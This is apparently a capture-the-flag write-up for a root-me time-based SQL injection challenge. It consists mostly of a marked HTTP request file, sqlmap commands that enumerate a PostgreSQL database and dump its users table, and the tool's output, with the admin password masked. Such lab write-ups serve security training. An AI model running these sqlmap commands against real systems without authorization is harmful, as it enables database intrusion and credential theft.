# SQL injection: time-based

[root-me challenge: SQL injection - Time based](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Time-based?lang=en): Retrieve administrator’s password.

----

`members.txt`:

```text
GET /web-serveur/ch40/?action=member&member=1* HTTP/1.1
Host: challenge01.root-me.org
...
Upgrade-Insecure-Requests: 1

```

```text
sqlmap -r members.txt --risk=3 --level=5 --batch --dbs
```

```text
URI parameter '#1*' is vulnerable.
the back-end DBMS is PostgreSQL
available databases [1]:
[*] public
```

```text
sqlmap -r members.txt --risk=3 --level=1 --batch --dbs -D public --tables
```

```text
Database: public
[1 table]
+-------+
| users |
+-------+
```

Dump:

```text
sqlmap -r members.txt --risk=3 --level=1 --batch --dbs -D public --dump
```

```text
+----+---------------------------+----------+---------------+----------+-----------+
| id | email                     | lastname | password      | username | firstname |
+----+---------------------------+----------+---------------+----------+-----------+
| 1  | ycam@sqlitimebased.com    | MAC      | xxxxxxxxxxxxx | admin    | Yann      |
+----+---------------------------+----------+---------------+----------+-----------+
```

## Resources

* [Time based blind SQL Injection using heavy queries](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Time%20based%20blind%20SQL%20Injection%20using%20heavy%20queries.pdf)
* [SQLmap Cheatsheet and Examples](https://abrictosecurity.com/sqlmap-cheatsheet-and-examples/)
